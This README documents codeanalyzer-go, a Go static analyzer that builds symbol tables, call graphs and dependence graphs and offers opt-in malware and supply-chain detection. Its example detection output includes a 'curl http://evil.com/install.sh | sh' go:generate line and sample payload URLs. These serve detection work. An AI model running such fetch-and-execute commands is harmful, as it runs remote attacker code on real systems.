# codeanalyzer-go

[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev/)
[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

**Static analyzer for Go projects**, compatible with [CodeLLM DevKit (CLDK)](https://github.com/codellm-devkit). Produces Symbol Table, Call Graph, PDG/SDG, and **Security Analysis** (string extraction, supply chain detection, obfuscation metrics) in stable JSON format.

## Features

- **Symbol Table Extraction**: packages, imports, types (struct/interface/alias), functions, methods, variables, constants
- **Interface Method Signatures**: extracts methods declared in interfaces with parameters, results and documentation
- **Package Documentation**: extracts package-level doc comments
- **Package-Level Security Metadata**: identifies `init()`, goroutines (`go` statements), environment variable reads, build constraints, reverse imports, and reachability from `main()`
- **Call Examples**: identifies callers of each function (requires `--include-body`)
- **Clean Documentation**: newlines removed from all docstrings for cleaner JSON output
- **Call Graph Construction**: using `golang.org/x/tools/go/ssa` with CHA or RTA algorithms
- **API Category Classification**: call graph edges automatically tagged with security categories (`execution`, `network`, `filesystem`, `crypto`, `process`, `reflection`, `unsafe`, `plugin`)
- **PDG (Program Dependence Graph)**: intra-procedural data and control dependency analysis per function, grouped by package
- **SDG (System Dependence Graph)**: inter-procedural analysis with call/param-in/param-out edges
- **🔒 Security Analysis** (opt-in via `--security`):
  - **String Literal Extraction**: extracts all string constants with automatic classification (URL, IP, path, command, base64, crypto wallet, domain, etc.) and Shannon entropy
  - **Supply Chain Vector Detection**: identifies `//go:generate`, `//go:linkname`, CGo, `plugin.Open`, `unsafe`, `init()` side-effects, global variable side-effects, reflection-based dynamic dispatch
  - **Obfuscation Metrics**: average name lengths, short names ratio, doc coverage, XOR operation count, Garble obfuscator pattern detection
- **CLDK Compatible**: output follows CLDK schema conventions for seamless integration
- **Compact Output**: LLM-optimized format with ~70-85% size reduction
- **Flexible Filtering**: exclude directories, filter by package path, include/exclude tests
- **Position Tracking**: detailed or minimal source position information

## Installation

### Prerequisites

This analyzer is designed to work with [CodeLLM DevKit (CLDK)](https://github.com/codellm-devkit/cldk). If you plan to use it with CLDK:

1. First, fork/clone the CLDK repository:
   ```bash
   git clone https://github.com/codellm-devkit/cldk.git
   ```

2. Then, fork/clone this analyzer (separate repository):
   ```bash
   git clone https://github.com/battuto/codeanalyzer-go.git
   ```

### Build from Source

```bash
cd codeanalyzer-go
go build -o bin/codeanalyzer-go ./cmd/codeanalyzer-go
```

### Cross-Platform 64-bit Builds

Build for all platforms at once:

```bash
# Linux/macOS
make build-all

# Windows (PowerShell)
.\scripts\build.ps1
```

Generates binaries in `bin/`:
- `codeanalyzer-go-windows-amd64.exe`
- `codeanalyzer-go-linux-amd64`
- `codeanalyzer-go-darwin-amd64` (Intel Mac)
- `codeanalyzer-go-darwin-arm64` (Apple Silicon)

### Standalone Usage

You can also use this analyzer independently without CLDK:

```bash
go install github.com/battuto/codeanalyzer-go/cmd/codeanalyzer-go@latest
```

## Quick Start

```bash
# Analyze a project (full analysis to stdout)
codeanalyzer-go --input /path/to/project

# Symbol table only
codeanalyzer-go --input ./myproject --analysis-level symbol_table

# Call graph with RTA algorithm
codeanalyzer-go --input ./myproject --analysis-level call_graph --cg rta

# PDG (Program Dependence Graph)
codeanalyzer-go --input ./myproject --analysis-level pdg

# Save output to directory
codeanalyzer-go --input ./myproject --output ./output

# 🔒 Enable security analysis (strings, supply chain, obfuscation)
codeanalyzer-go --input ./myproject --security

# Full analysis with security + compact output for LLM
codeanalyzer-go --input ./myproject --security --compact -o ./output
```

## CLI Reference

```
codeanalyzer-go [flags]
```

### Main Flags

| Flag | Short | Description | Default |
|------|-------|-------------|---------|
| `--input` | `-i` | Path to Go project root | `.` |
| `--output` | `-o` | Output directory (omit for stdout) | stdout |
| `--analysis-level` | `-a` | Analysis level: `symbol_table`, `call_graph`, `pdg`, `full` | `full` |
| `--cg` | | Call graph algorithm: `cha`, `rta` | `rta` |
| `--format` | `-f` | Output format: `json` | `json` |
| `--compact` | `-c` | **LLM-optimized output** (~70-85% smaller) | `false` |

### Filtering Flags

| Flag | Description | Example |
|------|-------------|---------|
| `--include-tests` | Include `*_test.go` files | `--include-tests` |
| `--exclude-dirs` | Comma-separated directories to exclude | `--exclude-dirs vendor,testdata` |
| `--only-pkg` | Filter packages by path substring | `--only-pkg myapp/internal` |

### Output Flags

| Flag | Description | Default |
|------|-------------|---------|
| `--emit-positions` | Position detail: `detailed`, `minimal` | `detailed` |
| `--include-body` | Include function body information | `false` |
| `--verbose`, `-v` | Enable verbose logging to stderr | `false` |
| `--quiet`, `-q` | Suppress non-error output | `false` |
| `--security` | Enable security analysis (strings, supply chain, obfuscation) | `false` |
| `--version` | Show version and exit | |

## Output Schema

The output follows CLDK conventions with this structure:

```json
{
  "metadata": {
    "analyzer": "codeanalyzer-go",
    "version": "2.1.0",
    "language": "go",
    "analysis_level": "full",
    "timestamp": "2026-04-07T14:00:00Z",
    "project_path": "/path/to/project",
    "go_version": "go1.24",
    "analysis_duration_ms": 1234
  },
  "symbol_table": {
    "packages": {
      "example.com/myapp": {
        "path": "example.com/myapp",
        "name": "myapp",
        "documentation": "Package myapp provides the main entry point.",
        "files": ["main.go", "util.go"],
        "imports": [{"path": "fmt"}],
        "has_init": true,
        "has_goroutines": true,
        "reads_env": false,
        "build_tags": ["linux"],
        "used_by_packages": [],
        "reachable_from_main": true,
        "type_declarations": {
          "example.com/myapp.Service": {
            "kind": "interface",
            "interface_methods": [
              {
                "name": "Start",
                "signature": "Start() error",
                "parameters": [],
                "results": [{"type": "error"}],
                "documentation": "Start initializes the service."
              }
            ]
          }
        },
        "callable_declarations": {
          "example.com/myapp.main": {
            "name": "main",
            "signature": "func main()",
            "kind": "function",
            "call_examples": ["called by init() [call]"]
          }
        },
        "variables": {},
        "constants": {}
      }
    }
  },
  "call_graph": {
    "algorithm": "rta",
    "nodes": [{"id": "example.com/myapp.main", "kind": "function"}],
    "edges": [{"source": "example.com/myapp.main", "target": "fmt.Println", "kind": "call", "category": "filesystem"}]
  },
  "pdg": {
    "packages": {
      "example.com/myapp": {
        "functions": {
          "example.com/myapp.main": {
            "qualified_name": "example.com/myapp.main",
            "package": "example.com/myapp",
            "nodes": [
              {"id": 0, "kind": "entry", "instr": "entry: main"},
              {"id": 1, "kind": "call", "instr": "fmt.Println(...)"}
            ],
            "data_edges": [
              {"from": 0, "to": 1, "var": "t0"}
            ],
            "control_edges": []
          }
        }
      }
    }
  },
  "sdg": {
    "packages": {
      "example.com/myapp": {
        "inter_edges": [
          {
            "kind": "call",
            "caller_func": "example.com/myapp.main",
            "callee_func": "fmt.Println",
            "caller_node": 1,
            "callee_node": 0
          }
        ]
      }
    }
  },
  "issues": []
}
```

### Key Schema Conventions

- **Maps, not arrays**: `packages`, `type_declarations`, `callable_declarations` are maps keyed by qualified name
- **Qualified names**: Format is `pkg.Func` or `pkg.(*Type).Method`
- **Positions**: Include `file`, `start_line`, `start_column`
- **Clean documentation**: all newlines removed from docstrings for cleaner output
- **Security Metadata**: Packages include fields for malware/security analysis (`has_init`, `has_goroutines`, `reads_env`, `build_tags`, `used_by_packages`, `reachable_from_main`)
- **Interface methods**: `interface_methods` array on interface types with name, signature, parameters, results, documentation
- **Call examples**: `call_examples` array on callables (requires `--include-body`)
- **PDG per-package**: `pdg.packages` mirrors `symbol_table.packages` — each package contains a `functions` map with nodes, data edges (use-def), and control edges (branch conditions)
- **SDG per-caller-package**: `sdg.packages` groups inter-procedural edges (call, param-in, param-out) by the package where the caller resides
- **API Categories**: call graph edges include `category` field for security-relevant API calls (`execution`, `network`, `filesystem`, `crypto`, `process`, `reflection`, `unsafe`, `plugin`)

## 🔒 Security Analysis

Enable with `--security` to add malware and supply chain analysis data. All security fields are opt-in and `omitempty` — existing CLDK consumers see no changes without the flag.

```bash
codeanalyzer-go --input ./suspicious-project --security --verbose
```

### String Literal Extraction

Extracts all string constants from the source code, classifies them, and computes Shannon entropy:

```json
"string_literals": [
  {
    "value": "http://evil.com/payload.exe",
    "category": "url",
    "entropy": 4.12,
    "scope": "main.downloadPayload",
    "position": {"file": "main.go", "start_line": 42, "start_column": 18}
  },
  {
    "value": "C:\\Windows\\System32\\cmd.exe",
    "category": "path_win",
    "entropy": 3.89,
    "scope": "main.executeBackdoor"
  }
]
```

**Categories:** `url`, `ip`, `path_win`, `path_unix`, `base64`, `command`, `crypto_wallet`, `mining_pool`, `domain`, `registry`, `email`, `other`

### Supply Chain Vector Detection

Detects attack vectors inspired by the [GoSurf](https://arxiv.org/abs/2407.04442) taxonomy:

```json
"supply_chain_vectors": [
  {
    "kind": "go_generate",
    "detail": "curl http://evil.com/install.sh | sh",
    "severity": "critical",
    "file": "generate.go",
    "position": {"file": "generate.go", "start_line": 3}
  },
  {
    "kind": "init_side_effect",
    "detail": "init() calls: http.Get, exec.Command",
    "severity": "critical",
    "file": "backdoor.go"
  }
]
```

**Vector Kinds:** `go_generate`, `go_linkname`, `compiler_directive`, `cgo_usage`, `plugin_load`, `unsafe_usage`, `init_side_effect`, `global_side_effect`, `dynamic_dispatch`

### Obfuscation Metrics

Computes per-package heuristic indicators for code obfuscation:

```json
"obfuscation_metrics": {
  "avg_func_name_len": 5.2,
  "avg_var_name_len": 3.1,
  "short_names_ratio": 42.5,
  "doc_coverage": 0.0,
  "string_entropy_avg": 4.8,
  "high_entropy_strings": 15,
  "xor_operations": 7,
  "has_garble_patterns": true
}
```

### API Category Classification

Call graph edges are automatically enriched with security categories (~70 stdlib APIs mapped):

| Category | Example APIs |
|----------|-------------|
| `execution` | `os/exec.Command`, `syscall.Exec` |
| `network` | `net.Dial`, `net/http.Get`, `net.Listen` |
| `filesystem` | `os.WriteFile`, `os.Remove`, `os.ReadFile` |
| `crypto` | `crypto/aes.NewCipher`, `crypto/rsa.GenerateKey` |
| `process` | `os.Exit`, `os/signal.Notify` |
| `reflection` | `reflect.ValueOf`, `reflect.MakeFunc` |
| `unsafe` | `unsafe.Pointer` |
| `plugin` | `plugin.Open` |

> **Note:** API categories are always active on call graph edges (not gated by `--security`), as they enrich existing data with zero overhead.

## LLM Compact Output

Use `--compact` for LLM-optimized output with ~70-85% size reduction:

```bash
# Compact symbol table
codeanalyzer-go -i ./myproject -a symbol_table --compact > analysis.json

# Compact full analysis with body
codeanalyzer-go -i ./myproject -a full --compact --include-body -o ./output
```

**Compact Schema Structure (Legend):**

- **Root Keys**:
  - `m` : Meta (version, duration)
  - `p` : Packages (map of `package_path` -> `Package`)
  - `cg`: Call Graph
  - `pdg` / `sdg` : Dependency Graphs
  - `iss`: Issues & Warnings

- **Inside Package (`p`)**:
  - `n` : Name / `d` : Documentation / `f` : Files
  - `i` : Imports / `t` : Types / `fn` : Functions / `v` : Vars / `c` : Constants
  - **Security Flags**: `init`, `gor` (goroutine), `env`, `bt` (build tags), `ub` (used by), `main`
  - **Security Analysis (v2.1.0)**:
    - `sl`: String Literals (`v`: value, `c`: category, `e`: entropy, `s`: scope)
    - `sc`: Supply Chain Vectors (`k`: kind, `s`: severity, `d`: detail)
    - `obf`: Obfuscation Metrics (`fl`: avg func len, `vl`: avg var len, `sr`: short ratio, `dc`: doc coverage, `xor`: xor ops, `se`: string entropy, `hs`: high entropy strings, `gb`: garble detected)

- **Inside Functions (`fn`) & Types (`t`)**:
  - `ex`: Call examples
  - `im`: Interface methods (on types)
  - *Note: position info is omitted, and docstrings are truncated to 200 chars*

## Call Graph Algorithms

| Algorithm | Description | Best For |
|-----------|-------------|----------|
| **CHA** | Class Hierarchy Analysis - conservative, includes all possible call targets | Complete analysis, interface-heavy code |
| **RTA** | Rapid Type Analysis - more precise, starts from `main()` | Focused analysis, smaller output |

```bash
# CHA (more conservative)
codeanalyzer-go --input ./myapp --analysis-level call_graph --cg cha

# RTA (more precise, requires main package)
codeanalyzer-go --input ./myapp --analysis-level call_graph --cg rta
```

## CLDK Python Integration

```python
from cldk.analysis import GoAnalyzer

analyzer = GoAnalyzer()
result = analyzer.analyze("/path/to/project", level="full")

# Access symbol table
for pkg_path, pkg in result.symbol_table.packages.items():
    print(f"Package: {pkg.name}")
    for fn_name, fn in pkg.callable_declarations.items():
        print(f"  Function: {fn.name} - {fn.signature}")

# Access call graph
for edge in result.call_graph.edges:
    print(f"{edge.source} -> {edge.target}")

# Access PDG per-package (iterate alongside symbol table)
for pkg_path, pkg_pdg in result.pdg.packages.items():
    print(f"\nPDG for {pkg_path}:")
    for fn_name, fn_pdg in pkg_pdg.functions.items():
        print(f"  {fn_name}: {len(fn_pdg.nodes)} nodes, "
              f"{len(fn_pdg.data_edges)} data deps, "
              f"{len(fn_pdg.control_edges)} control deps")

# Access SDG per-caller-package (ideal for capability analysis)
for pkg_path, pkg_sdg in result.sdg.packages.items():
    print(f"\nSDG Edges originating from {pkg_path}: {len(pkg_sdg.inter_edges)}")
    for edge in pkg_sdg.inter_edges:
        print(f"  {edge.kind}: {edge.caller_func} -> {edge.callee_func}")
```

## Testing

```bash
# Build all platform binaries
.\scripts\build.ps1

# Run Go unit tests
go test ./...

# Run Python integration tests (35 tests)
python tests/cldk_integration_test.py
```

The integration tests cover: schema validation, new features (interface methods, package doc, call examples), compact format, real-world target (FRP project), legacy compatibility, positions, and error handling.

## Exit Codes

| Code | Meaning |
|------|---------|
| `0` | Success |
| `1` | Analysis errors (partial results may be available) |
| `2` | Configuration or validation errors |

## Deprecated Flags (Legacy)

The following flags are deprecated but still supported for backward compatibility:

| Deprecated | Use Instead |
|------------|-------------|
| `--root` | `--input` |
| `--mode` | `--analysis-level` |
| `--out` | `--output` |
| `--include-test` | `--include-tests` |

## Troubleshooting

### Empty Call Graph with RTA

RTA requires a `main` package as entry point. If your project is a library, use CHA instead:

```bash
codeanalyzer-go --input ./mylib --analysis-level call_graph --cg cha
```

### Large Projects

For large codebases, use filters to reduce analysis scope:

```bash
codeanalyzer-go --input ./bigproject \
  --exclude-dirs vendor,testdata,examples \
  --only-pkg mycompany/bigproject/core
```

### Verbose Mode

Enable verbose mode to see analysis progress:

```bash
codeanalyzer-go --input ./myproject --verbose
```

## Project Structure

```
codeanalyzer-go/
├── cmd/codeanalyzer-go/    # CLI entry point
├── internal/
│   ├── loader/             # Package loading with SSA support
│   ├── symbols/            # Symbol table extraction
│   ├── callgraph/          # Call graph construction (CHA/RTA) + API categorization
│   ├── pdg/                # Program Dependence Graph (intra-procedural)
│   ├── sdg/                # System Dependence Graph (inter-procedural)
│   ├── strings/            # 🔒 String literal extraction & classification
│   ├── supplychain/        # 🔒 Supply chain vector detection
│   ├── obfuscation/        # 🔒 Obfuscation metrics computation
│   └── output/             # JSON output writer
├── pkg/schema/             # CLDK schema definitions + compact format
├── tests/                  # Integration tests
└── sampleapp/              # Sample Go project for testing
```

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---